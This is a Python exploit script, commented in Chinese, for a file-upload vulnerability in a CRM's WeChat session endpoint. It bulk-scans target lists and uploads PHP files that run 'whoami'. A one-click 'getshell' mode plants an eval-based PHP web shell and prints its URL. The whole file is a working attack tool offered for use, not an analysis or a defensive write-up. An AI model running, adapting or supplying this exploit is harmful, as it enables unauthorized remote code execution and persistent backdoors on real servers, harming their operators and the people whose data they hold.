import requests
from multiprocessing import Pool
import warnings
import argparse
import re
from lxml import etree
proxy="http://127.0.0.1:7890"

warnings.filterwarnings("ignore")
headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36',
        'Connection': 'keep-alive',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary03rNBzFMIytvpWhy'
    }


def main():
    argparser = argparse.ArgumentParser()
    argparser.add_argument("-u", "--url",dest="target", help="url检测")
    argparser.add_argument("-f", "--file",dest="file",help="批量检测")
    argparser.add_argument("-exp", "--exp",dest="exp",help="一键getshell")
    argparser.add_argument("-p", "--payload",dest="payload",help="shell内容")
    arg=argparser.parse_args()
    payload="<?php @eval($_POST[1]);?>"
    target = arg.target
    file = arg.file
    targets = []
    #if arg.exp :
    if target:
        #print(target)
        if arg.exp:
            if arg.payload:
                payload = arg.payload
                check(target)
                getshell(target,payload)
            else:
                getshell(target,payload)

        else:
            check(target)

    elif file:
        try:
            with open(file, "r", encoding="utf-8") as f:
                target = f.readlines()
                for target in target:
                    if "http" in target:
                        target = target.strip()
                        targets.append(target)
                    else:
                        target = "http://" + target
                        targets.append(target)
        except Exception as e:
            print("[文件错误！]")
        pool = Pool(processes=30)
        pool.map(check, targets)
def check(target):
    #print(target)
    data = """------WebKitFormBoundary03rNBzFMIytvpWhy
Content-Disposition: form-data; name="file"; filename="test.php"
Content-Type: image/jpeg

<?php system("whoami");unlink(__FILE__);?>
------WebKitFormBoundary03rNBzFMIytvpWhy--
        """
    try:
        url=f"{target}/crm/wechatSession/index.php?token=9b06a9617174f1085ddcfb4ccdb6837f&msgid=1&operation=upload"
        response = requests.post(url,headers=headers,data=data, timeout=3,verify=False)
        if response.status_code == 200 and "test.php" in response.text:
           print(f"[*]{target}存在漏洞")
        else:
            print(f"[!]{target}不存在漏洞")
    except Exception as e:
        pass

def getshell(target,payload):
    #print(target,payload)
    data = f"""------WebKitFormBoundary03rNBzFMIytvpWhy
Content-Disposition: form-data; name="file"; filename="test.php"
content-Type: image/jpeg

{payload}
------WebKitFormBoundary03rNBzFMIytvpWhy--
            """
    #print(data)
    try:
        url=f"{target}/crm/wechatSession/index.php?token=9b06a9617174f1085ddcfb4ccdb6837f&msgid=1&operation=upload"
        response = requests.post(url,headers=headers,data=data, timeout=3,verify=False)
        #print(response.text)
        if response.status_code == 200 and "test.php" in response.text:
            text = response.text
            #text ='{"code":0,"msg":"","result":{"upload_status":false,"filepath":"D:\/ldcrm\/www\/crm\/storage\/wechatsession\/2024\/12\/20\/test.php","filename":"test.php"}}'
            print(text)
            match = re.findall(r"D:\\/ldcrm\\/www\\/crm\\/storage\\/wechatsession\\/(\d{4}\\/\d{2}\\/\d{2})\\/test.php", text)
            print(match)
            for match in match:
                print(match)

            print(f"[*]文件地址 http://{url}/crm/storage/wechatsession/"+match+"/test.php")
    except Exception as e:
        pass
if __name__ == '__main__':
    main()